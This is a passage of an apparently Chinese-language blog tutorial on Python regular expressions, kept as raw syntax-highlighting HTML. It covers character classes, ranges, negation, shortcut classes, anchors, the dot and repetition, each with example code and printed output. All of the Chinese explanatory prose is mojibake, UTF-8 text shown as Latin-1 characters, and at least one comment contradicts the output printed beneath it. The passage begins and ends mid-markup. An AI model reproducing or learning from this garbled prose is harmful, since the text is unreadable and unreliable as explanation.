class="string">æœ€ç®€å•çš„æ­£åˆ™è¡¨è¾¾å¼æ˜¯å“ªäº›ä»…åŒ…å«ç®€å•å­—æ¯æ•°å­—å­—ç¬¦çš„è¡¨è¾¾å¼â€”â€”ä¸åŒ…å«ä»»ä½•å…¶ä»–å­—ç¬¦ã€‚</span></span><br><span class="line"><span class="string">å­—ç¬¦ä¸²Pythonæ˜¯ä¸€ä¸ªæœ‰æ•ˆçš„æ­£åˆ™è¡¨è¾¾å¼ï¼Œå®ƒä»…åŒ¹é…å•è¯ï¼Œé»˜è®¤æ­£åˆ™è¡¨è¾¾å¼åŒºåˆ†å¤§å°å†™ï¼Œä¾‹å¦‚ï¼š</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">a = re.search(<span class="string">r&#x27;Python&#x27;</span>,<span class="string">&#x27;I Like python&#x27;</span>)</span><br><span class="line">print(a)</span><br><span class="line">b = re.search(<span class="string">r&#x27;Python&#x27;</span>,<span class="string">&#x27;I LIKE PYTHON&#x27;</span>)</span><br><span class="line">print(b)</span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">ä¸è¿‡å¦‚æœåªæ˜¯ä½¿ç”¨æ­£åˆ™è¡¨è¾¾å¼æ¥åŒ¹é…æ–‡æœ¬ï¼Œæ²¡æœ‰ä»€ä¹ˆå®é™…çš„æ„ä¹‰ï¼Œ</span></span><br><span class="line"><span class="string">æ¯•ç«Ÿæ£€æµ‹ä¸€ä¸ªæ–‡æœ¬ä¸­æ˜¯å¦æœ‰å¦ä¸€ä¸ªå­—ç¬¦ä¸²æœ¬æ¥å°±éå¸¸ç®€å•ã€‚</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">æ­£åˆ™è¡¨è¾¾å¼å¼ºå¤§çš„åœ°æ–¹åœ¨äºèƒ½å¤ŸæŒ‡å®šç”¨äºåŒ¹é…çš„æ–‡æœ¬æ¨¡å¼ã€‚</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure><pre><code>NoneNone</code></pre><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">a = re.findall(<span class="string">r&#x27;[Pp]ython&#x27;</span>,<span class="string">&#x27;I Like Python3 and I like python2.7&#x27;</span>)</span><br><span class="line">print(a)</span><br><span class="line"></span><br><span class="line"><span class="comment">#å¯ä»¥å‘ç°[Pp]æ—¢å¯ä»¥åŒ¹é…å¤§å†™çš„Pä¹Ÿå¯ä»¥åŒ¹é…å°å†™çš„p</span></span><br><span class="line"><span class="comment">#æ‰§è¡Œä¼šå‘ç°è¾“å‡ºä¸ºç©ºæ•°ç»„ï¼Œè¿™é‡Œå€¼çš„æˆ‘ä»¬æ³¨æ„çš„æ˜¯[Pp]ä»…åŒ¹é…ä¸€ä¸ªå­—ç¬¦</span></span><br></pre></td></tr></table></figure><pre><code>[&#39;Python&#39;, &#39;python&#39;]</code></pre><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#åŒºé—´</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">æœ‰ä¸€äº›å¸¸è§çš„å­—ç¬¦ç»„éå¸¸å¤§ï¼Œæ¯”å¦‚ï¼Œæˆ‘ä»¬è¦åŒ¹é…çš„æ˜¯ä»»æ„æ•°å­—ï¼Œå¦‚æœä¾ç…§ä¸Šè¿°ä»£ç ï¼Œ</span></span><br><span class="line"><span class="string">æ¯æ¬¡æˆ‘ä»¬éƒ½éœ€è¦ä½¿ç”¨[0123456789] è¿™ç§æ–¹å¼æ˜æ˜¾å¾ˆä¸æ˜æ™ºï¼Œ</span></span><br><span class="line"><span class="string">è€Œå¦‚æœè¦åŒ¹é…ä»a-zçš„å­—æ¯ï¼Œæˆ‘ä»¬ä¹Ÿè¿™æ ·ç¼–å†™ä»£ç çš„è¯ï¼Œè‚¯å®šä¼šè®©æˆ‘ä»¬å´©æºƒ</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">ä¸ºäº†é€‚åº”è¿™ä¸€ç‚¹ï¼Œæ­£åˆ™è¡¨è¾¾å¼å¼•æ“åœ¨å­—ç¬¦ç»„ä¸­ä½¿ç”¨è¿å­—ç¬¦(-)ä»£è¡¨åŒºé—´ï¼Œ</span></span><br><span class="line"><span class="string">æ‰€ä»¥æˆ‘ä»¬åŒ¹é…ä»»æ„æ•°å­—å¯ä»¥ä½¿ç”¨[0-9]ï¼Œæ‰€ä»¥å¦‚æœæˆ‘ä»¬æƒ³è¦åŒ¹é…æ‰€æœ‰å°å†™å­—æ¯ï¼Œ</span></span><br><span class="line"><span class="string">å¯ä»¥å†™æˆ[a-z]ï¼Œæƒ³è¦åŒ¹é…æ‰€æœ‰å¤§å†™å­—æ¯å¯ä»¥å†™æˆ[A-Z]</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">å¯èƒ½æˆ‘ä»¬è¿˜æœ‰ä¸ªéœ€æ±‚ï¼šåŒ¹é…è¿å­—ç¬¦ã€‚å› ä¸º-åœ¨ä¼šè¢«æ­£åˆ™è¡¨è¾¾å¼å¼•æ“ç†è§£ä¸ºä»£è¡¨è¿æ¥åŒºé—´ï¼Œ</span></span><br><span class="line"><span class="string">æ‰€ä»¥è¿™ä¸ªæ—¶å€™æˆ‘ä»¬éœ€è¦å¯¹-è¿›è¡Œè½¬ä¹‰</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">a = re.findall(<span class="string">r&#x27;[0-9]&#x27;</span>,<span class="string">&#x27;xxx007abc&#x27;</span>)</span><br><span class="line">b = re.findall(<span class="string">r&#x27;[a-z]&#x27;</span>,<span class="string">&#x27;abc001ABC&#x27;</span>)</span><br><span class="line">c = re.findall(<span class="string">r&#x27;[A-Za-z0-9]&#x27;</span>,<span class="string">&#x27;abc007ABC&#x27;</span>)</span><br><span class="line">d = re.findall(<span class="string">r&#x27;[0-9\-]&#x27;</span>,<span class="string">&#x27;0edu 007-edu&#x27;</span>)</span><br><span class="line">print(a)</span><br><span class="line">print(b)</span><br><span class="line">print(c)</span><br><span class="line">print(d)</span><br></pre></td></tr></table></figure><pre><code>[&#39;0&#39;, &#39;0&#39;, &#39;7&#39;][&#39;a&#39;, &#39;b&#39;, &#39;c&#39;][&#39;a&#39;, &#39;b&#39;, &#39;c&#39;, &#39;0&#39;, &#39;0&#39;, &#39;7&#39;, &#39;A&#39;, &#39;B&#39;, &#39;C&#39;][&#39;0&#39;, &#39;0&#39;, &#39;0&#39;, &#39;7&#39;, &#39;-&#39;]</code></pre><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#å–å</span></span><br><span class="line">a = re.findall(<span class="string">r&#x27;[^0-9]&#x27;</span>,<span class="string">&#x27;xxx007abc&#x27;</span>)</span><br><span class="line">b = re.search(<span class="string">r&#x27;[^0-9]&#x27;</span>,<span class="string">&#x27;xxx007abc&#x27;</span>)</span><br><span class="line">print(a)</span><br><span class="line">print(b)</span><br><span class="line"><span class="comment">#å¯ä»¥é€šè¿‡åœ¨å­—ç¬¦æ•°ç»„å¼€å¤´ä½¿ç”¨^å­—ç¬¦å®ç°å–åæ“ä½œï¼Œä»è€Œå¯ä»¥åè½¬ä¸€ä¸ªå­—ç¬¦ç»„ï¼ˆæ„å‘³ç€ä¼šåŒ¹é…ä»»ä½•æŒ‡å®šå­—ç¬¦ä¹‹å¤–çš„æ‰€æœ‰å­—ç¬¦ï¼‰</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">æ¥ä¸‹æ¥åœ¨çœ‹ä¸€ä¸ªè¡¨è¾¾å¼ï¼šn[^e] è¿™æ„å‘³ç€å­—ç¬¦næ¥ä¸‹æ¥çš„å­—ç¬¦æ˜¯é™¤äº†eä¹‹å¤–æ‰€æœ‰çš„å­—ç¬¦</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">a = re.findall(<span class="string">r&#x27;n[^e]&#x27;</span>,<span class="string">&#x27;final&#x27;</span>)</span><br><span class="line">b = re.search(<span class="string">r&#x27;n[^e]&#x27;</span>,<span class="string">&#x27;final&#x27;</span>)</span><br><span class="line">c = re.findall(<span class="string">r&#x27;[n[^e]]&#x27;</span>,<span class="string">&#x27;Python&#x27;</span>)</span><br><span class="line">print(a)</span><br><span class="line">print(b)</span><br><span class="line">print(c)</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">è¿™é‡Œæˆ‘ä»¬å¯ä»¥å‘ç°aå’ŒbåŒ¹é…çš„æ˜¯naï¼Œå­—ç¬¦aå› ä¸ºä¸æ˜¯eæ‰€ä»¥å¯ä»¥è¢«åŒ¹é…ï¼Œ</span></span><br><span class="line"><span class="string">è€Œå˜é‡cçš„å€¼ä¸ºç©ºï¼Œåœ¨è¿™é‡Œæ­£åˆ™è¡¨è¾¾å¼å¼•æ“åªåŒ¹é…åˆ°äº†å­—ç¬¦ä¸²nçš„ä½ç½®ï¼Œ</span></span><br><span class="line"><span class="string">è€Œnä¹‹åæ²¡æœ‰ä»»ä½•å¯ä»¥åŒ¹é…[^e]çš„å­—ç¬¦äº†ï¼Œæ‰€ä»¥è¿™é‡Œä¹ŸåŒ¹é…å¤±è´¥</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure><pre><code>[&#39;x&#39;, &#39;x&#39;, &#39;x&#39;, &#39;a&#39;, &#39;b&#39;, &#39;c&#39;]&lt;re.Match object; span=(0, 1), match=&#39;x&#39;&gt;[&#39;na&#39;]&lt;re.Match object; span=(2, 4), match=&#39;na&#39;&gt;[]</code></pre><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#å¿«æ·æ–¹å¼</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">å‡ ç§æ™®é€šå­—ç¬¦ç»„è¿˜åœ¨æ­£åˆ™è¡¨è¾¾å¼å¼•æ“ä¸­æœ‰å‡ ä¸ªé¢„å®šä¹‰çš„å¿«æ·æ–¹å¼ï¼Œå¦‚æœæˆ‘ä»¬æƒ³è¦å®šä¹‰å•è¯ï¼Œä»¥ç›®å‰å­¦åˆ°çš„å¯èƒ½ä¼šä½¿ç”¨[A-Za-z]ï¼Œä½†æ˜¯ï¼Œå¾ˆå¤šå•è¯éƒ½æ˜¯ä½¿ç”¨è¯¥å·¨å‰‘ä»¥å¤–çš„å­—ç¬¦ã€‚æ¯”å¦‚ä¸­æ–‡ï¼Œä»¥åŠå…¶ä»–è¯­è¨€ï¼Œ</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">æ­£åˆ™è¡¨è¾¾å¼å¼•æ“æä¾›äº†ä¸€äº›å¿«æ·æ–¹å¼ï¼šw ï¼Œä¸ â€œä»»æ„å•è¯å­—ç¬¦â€åŒ¹é…ï¼Œåœ¨Python3ä¸­ï¼ŒåŸºæœ¬ä¸Šå¯ä»¥åŒ¹é…ä»»ä½•è¯­è¨€çš„ä»»æ„å•è¯ã€‚</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">è€Œå½“æˆ‘ä»¬æƒ³è¦åŒ¹é…ä»»æ„æ•°å­—çš„æ—¶å€™ä¹Ÿå¯ä»¥ä½¿ç”¨å¿«æ·æ–¹å¼ \d då³digitï¼Œåœ¨Python3ä¸­å®ƒé™¤äº†å¯ä»¥å’Œ[0-9]åŒ¹é…ï¼Œè¿˜å¯ä»¥å’Œå…¶ä»–è¯­è¨€çš„æ•°å­—åŒ¹é…ã€‚</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">\så¿«æ·æ–¹å¼åŒ¹é…ç©ºç™½å­—ç¬¦ï¼Œæ¯”å¦‚ç©ºæ ¼ï¼Œtabã€æ¢è¡Œ ç­‰ã€‚</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">\b å¿«æ·æ–¹å¼åŒ¹é…ä¸€ä¸ªé•¿åº¦ä¸º0çš„å­—ç¬¦ä¸²ï¼Œä½†æ˜¯ï¼Œä»–ä»…ä»…åœ¨ä¸€ä¸ªå•è¯å¼€å§‹æˆ–ç»“å°¾å¤„åŒ¹é…ï¼Œè¿™è¢«ç§°ä¸ºè¯è¾¹ç•Œå¿«æ·æ–¹å¼</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">å¿«æ·æ–¹å¼æè¿°</span></span><br><span class="line"><span class="string">wä¸ä»»æ„å•è¯åŒ¹é…</span></span><br><span class="line"><span class="string">dä¸ä»»æ„æ•°å­—åŒ¹é…</span></span><br><span class="line"><span class="string">såŒ¹é…ç©ºç™½å­—ç¬¦ï¼Œæ¯”å¦‚ç©ºæ ¼ tab æ¢è¡Œ ç­‰</span></span><br><span class="line"><span class="string">båŒ¹é…ä¸€ä¸ªé•¿åº¦ä¸º0çš„å­ä¸²  #ç©ºå­—ç¬¦</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#ç¤ºä¾‹ï¼š</span></span><br><span class="line">a = re.findall(<span class="string">r&#x27;\w&#x27;</span>,<span class="string">&#x27;å­¦å¥½Python å¤§å±•æ‹³è„š&#x27;</span>) <span class="comment">#ä»»æ„å•è¯åŒ¹é…</span></span><br><span class="line">b = re.search(<span class="string">r&#x27;\w&#x27;</span>,<span class="string">&#x27;python3&#x27;</span>) </span><br><span class="line">c = re.search(<span class="string">r&#x27;\d&#x27;</span>,<span class="string">&#x27;ç¼–å·89757&#x27;</span>)</span><br><span class="line">print(a)</span><br><span class="line">print(b)</span><br><span class="line">print(c)</span><br><span class="line"><span class="comment">#è¿™é‡Œfindallä¼šè¿”å›æ‰€æœ‰èƒ½åŒ¹é…çš„å€¼ï¼Œsearchåªä¼šè¿”å›ç¬¬ä¸€ä¸ªåŒ¹é…åˆ°çš„å€¼</span></span><br><span class="line"></span><br><span class="line">d = re.findall(<span class="string">r&#x27;\bmaster\b&#x27;</span>,<span class="string">&#x27;masterxiao-master-xxx master abc&#x27;</span>)</span><br><span class="line">e = re.search(<span class="string">r&#x27;\smaster\s&#x27;</span>,<span class="string">&#x27;masterxiao master xxxx&#x27;</span>)</span><br><span class="line">print(d)</span><br><span class="line">print(e)</span><br></pre></td></tr></table></figure><pre><code>[&#39;å­¦&#39;, &#39;å¥½&#39;, &#39;P&#39;, &#39;y&#39;, &#39;t&#39;, &#39;h&#39;, &#39;o&#39;, &#39;n&#39;, &#39;å¤§&#39;, &#39;å±•&#39;, &#39;æ‹³&#39;, &#39;è„š&#39;]&lt;re.Match object; span=(0, 1), match=&#39;p&#39;&gt;&lt;re.Match object; span=(2, 3), match=&#39;8&#39;&gt;[&#39;master&#39;, &#39;master&#39;]&lt;re.Match object; span=(10, 18), match=&#39; master &#39;&gt;</code></pre><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#å¿«æ·æ–¹å¼å–å</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">ä¹‹å‰æåˆ°äº†å–åï¼Œå¿«æ·æ–¹å¼ä¹Ÿå¯ä»¥å–åï¼Œ </span></span><br><span class="line"><span class="string">ä¾‹å¦‚å¯¹äº \wçš„å–åä¸º\Wï¼Œå¯ä»¥å‘ç°å°†å°å†™æ”¹å†™æˆå¤§å†™å³å¯ã€‚</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">æ³¨æ„è¿™é‡Œ\B æœ‰æ‰€ä¸åŒï¼Œ b åŒ¹é…çš„æ˜¯åœ¨å•è¯å¼€å§‹æˆ–ç»“æŸä½ç½®é•¿åº¦ä¸º0çš„å­å­—ç¬¦ä¸²ï¼Œ</span></span><br><span class="line"><span class="string">è€Œ\BåŒ¹é…ä¸åœ¨å•è¯å¼€å§‹å’Œç»“æŸä½ç½®çš„é•¿åº¦ä¸º0çš„å­å­—ç¬¦ä¸²</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">a = re.findall(<span class="string">r&#x27;\Bmaster\B&#x27;</span>,<span class="string">&#x27;masterxiao master xxx master abc&#x27;</span>)</span><br><span class="line"></span><br><span class="line">b = re.search(<span class="string">r&#x27;master\B&#x27;</span>,<span class="string">&#x27;masterxiao&#x27;</span>)</span><br><span class="line"></span><br><span class="line">c = re.findall(<span class="string">r&#x27;\Bmaster\B&#x27;</span>,<span class="string">&#x27;1master1&#x27;</span>)</span><br><span class="line">print(a)</span><br><span class="line">print(b)</span><br><span class="line">print(c)</span><br></pre></td></tr></table></figure><pre><code>[]&lt;re.Match object; span=(0, 6), match=&#39;master&#39;&gt;[&#39;master&#39;]</code></pre><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#å­—ç¬¦ä¸²çš„å¼€å§‹å’Œç»“æŸ</span></span><br><span class="line"></span><br><span class="line">a = re.search(<span class="string">r&#x27;^python&#x27;</span>,<span class="string">&#x27;this code in python3&#x27;</span>)</span><br><span class="line">b = re.search(<span class="string">r&#x27;python$&#x27;</span>,<span class="string">&#x27;this code in python3&#x27;</span>)</span><br><span class="line"></span><br><span class="line">c = re.search(<span class="string">r&#x27;^python&#x27;</span>,<span class="string">&#x27;python is my favorite&#x27;</span>)</span><br><span class="line">d = re.search(<span class="string">r&#x27;python$&#x27;</span>,<span class="string">&#x27;this is code in python&#x27;</span>)</span><br><span class="line"></span><br><span class="line">print(a)</span><br><span class="line">print(b)</span><br><span class="line">print(c)</span><br><span class="line">print(d)</span><br><span class="line"></span><br><span class="line"><span class="comment">#é€šè¿‡ä¸Šè¿°ä¾‹å­ï¼Œæˆ‘ä»¬å¯ä»¥å‘ç° ^æŒ‡å®šçš„æ˜¯ä¸€ä¸ªå­—ç¬¦ä¸²çš„å¼€å§‹ï¼Œ$æŒ‡å®šçš„æ˜¯ä¸€ä¸ªå­—ç¬¦ä¸²çš„ç»“æŸ</span></span><br></pre></td></tr></table></figure><pre><code>NoneNone&lt;re.Match object; span=(0, 6), match=&#39;python&#39;&gt;&lt;re.Match object; span=(16, 22), match=&#39;python&#39;&gt;</code></pre><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#ä»»æ„å­—ç¬¦</span></span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">.å­—ç¬¦æœ€åä¸€ä¸ªå¿«æ·æ–¹å¼å­—ç¬¦ï¼Œå®ƒä»£è¡¨åŒ¹é…ä»»ä½•å•ä¸ªå­—ç¬¦ï¼Œä¸è¿‡å€¼å¾—æ³¨æ„çš„æ˜¯ï¼Œå®ƒåªèƒ½å‡ºç°åœ¨æ–¹æ‹¬å·å­—ç¬¦ç»„ä»¥å¤–</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">å€¼å¾—æ³¨æ„çš„æ˜¯ï¼š&lt;font color = &quot;red&quot;&gt;.å­—ç¬¦åªæœ‰ä¸€ä¸ªä¸èƒ½åŒ¹é…çš„å­—ç¬¦ï¼Œ</span></span><br><span class="line"><span class="string">ä¹Ÿå°±æ˜¯æ¢è¡Œï¼ˆ\nï¼‰ï¼Œ&lt;/font&gt;ï¼Œä¸è¿‡è®©.å­—ç¬¦ä¸æ¢è¡Œç¬¦åŒ¹é…ä¹Ÿæ˜¯å¯èƒ½çš„ï¼Œä»¥åä¼šè®¨è®º</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">a = re.search(<span class="string">r&#x27;p.th.n&#x27;</span>,<span class="string">&#x27;hello python re&#x27;</span>)</span><br><span class="line">b = re.search(<span class="string">r&#x27;p.....&#x27;</span>,<span class="string">&#x27;å­¦å¥½ python äººè§äººçˆ±&#x27;</span>)</span><br><span class="line">print(a)</span><br><span class="line">print(b)</span><br><span class="line"></span><br></pre></td></tr></table></figure><pre><code>&lt;re.Match object; span=(6, 12), match=&#39;python&#39;&gt;&lt;re.Match object; span=(3, 9), match=&#39;python&#39;&gt;</code></pre><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># å¯é€‰å­—ç¬¦</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">åˆ°ç›®å‰ä¸ºæ­¢ï¼Œæˆ‘ä»¬çœ‹åˆ°çš„æ­£åˆ™è¡¨è¾¾å¼éƒ½æ˜¯åœ¨æ­£åˆ™è¡¨è¾¾å¼ä¸­çš„å­—ç¬¦ä¸è¢«æœç´¢çš„å­—ç¬¦ä¸²ä¸­çš„å­—ç¬¦ä¿æŒ1:1çš„å…³ç³»ã€‚</span></span><br><span class="line"><span class="string">ä¸è¿‡æœ‰æ—¶ï¼Œæˆ‘ä»¬å¯èƒ½æƒ³è¦åŒ¹é…ä¸€ä¸ªå•è¯çš„ä¸åŒå†™æ³•ï¼Œæ¯”å¦‚â€œcolorâ€å’Œâ€œcolourâ€ï¼Œæˆ–è€…â€œhonorâ€ä¸â€œhonourâ€ã€‚</span></span><br><span class="line"><span class="string">è¿™ä¸ªæ—¶å€™æˆ‘ä»¬å¯ä»¥ä½¿ç”¨ ? ç¬¦å·æŒ‡å®šä¸€ä¸ªå­—ç¬¦ã€å­—ç¬¦ç»„æˆ–å…¶ä»–åŸºæœ¬å•å…ƒå¯é€‰ï¼Œè¿™æ„å‘³ç€æ­£åˆ™è¡¨è¾¾å¼å¼•æ“å°†ä¼šæœŸæœ›è¯¥å­—ç¬¦å‡ºç°é›¶æ¬¡æˆ–ä¸€æ¬¡</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">a = re.search(<span class="string">r&#x27;honou?r&#x27;</span>,<span class="string">&#x27;He Served with honor and distinction&#x27;</span>)</span><br><span class="line">b = re.search(<span class="string">r&#x27;honou?r&#x27;</span>,<span class="string">&#x27;He Served with honour and distinction&#x27;</span>)</span><br><span class="line">c = re.search(<span class="string">r&#x27;honou?r&#x27;</span>,<span class="string">&#x27;He Served with honou and distinction&#x27;</span>)</span><br><span class="line"></span><br><span class="line">print(a)</span><br><span class="line">print(b)</span><br><span class="line">print(c)</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">å¯ä»¥å‘ç°ï¼Œåœ¨ä¸Šè¿°ä¸‰ä¸ªä¾‹å­ä¸­ï¼Œæ­£åˆ™è¡¨è¾¾å¼ä¸ºhonou?rï¼Œè¿™é‡Œå¯ä»¥åŒ¹é…çš„æ˜¯ honor å’Œ honour ä¸èƒ½åŒ¹é… honouï¼Œ</span></span><br><span class="line"><span class="string">å¯ä»¥çŸ¥é“çš„æ˜¯ ? ç¡®å®šäº†å‰ä¸€ä¸ªuæ˜¯å¯é€‰çš„ï¼Œåœ¨ç¬¬ä¸€ä¸ªç¤ºä¾‹ä¸­ï¼Œæ²¡æœ‰uï¼Œæ˜¯æ²¡æœ‰é—®é¢˜å¯ä»¥åŒ¹é…çš„ï¼Œ</span></span><br><span class="line"><span class="string">åœ¨ç¬¬äºŒä¸ªç¤ºä¾‹ä¸­ï¼Œuå­˜åœ¨è¿™ä¹Ÿæ²¡æœ‰é—®é¢˜ã€‚åœ¨ç¬¬ä¸‰ä¸ªä¾‹å­ä¸­ï¼Œuå­˜åœ¨ä½†æ˜¯rä¸å­˜åœ¨ï¼Œè¿™æ ·å°±ä¸èƒ½åŒ¹é…äº†</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure><pre><code>&lt;re.Match object; span=(15, 20), match=&#39;honor&#39;&gt;&lt;re.Match object; span=(15, 21), match=&#39;honour&#39;&gt;None</code></pre><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># é‡å¤</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">åˆ°ç›®å‰ä¸ºæ­¢ï¼Œæˆ‘ä»¬åªæ˜¯å­¦ä¹ äº†å…³äºä»…å‡ºç°ä¸€æ¬¡çš„å­—ç¬¦ä¸²åŒ¹é…ï¼Œåœ¨å®é™…å¼€å‘è¿‡ç¨‹ä¸­ï¼Œè¿™æ ·è‚¯å®šä¸èƒ½æ»¡è¶³éœ€æ±‚ï¼Œæ¯”å¦‚è¦åŒ¹é…ç”µè¯å·ç ï¼Œæ¯”å¦‚åŒ¹é…èº«ä»½è¯å·ï¼Œè¿™äº›éƒ½æ˜¯å¾ˆå¤šä¸ªæ•°å­—ç»„æˆçš„ã€‚</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">å¦‚æœé‡åˆ°è¿™æ ·çš„æƒ…å†µï¼Œæˆ‘ä»¬å¯èƒ½æœŸæœ›ä¸€ä¸ªå­—ç¬¦ç»„è¿ç»­åŒ¹é…å¥½å‡ æ¬¡ã€‚</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">åœ¨æ­£åˆ™è¡¨è¾¾å¼åœ¨ä¸€ä¸ªå­—ç¬¦ç»„ååŠ ä¸Š&#123;N&#125; å°±å¯ä»¥è¡¨ç¤º &#123;N&#125; ä¹‹å‰çš„å­—ç¬¦ç»„å‡ºç°Næ¬¡</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">re.findall(<span class="string">r&#x27;[\d]&#123;4&#125;-[\d]&#123;7&#125;&#x27;</span>,<span class="string">&#x27;å¼ ä¸‰ï¼š0731-8825951ï¼Œæå››ï¼š0733-8794561&#x27;</span>)</span><br></pre></td></tr></table></figure><pre><code>[&#39;0731-8825951&#39;, &#39;0733-8794561&#39;]</code></pre><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span 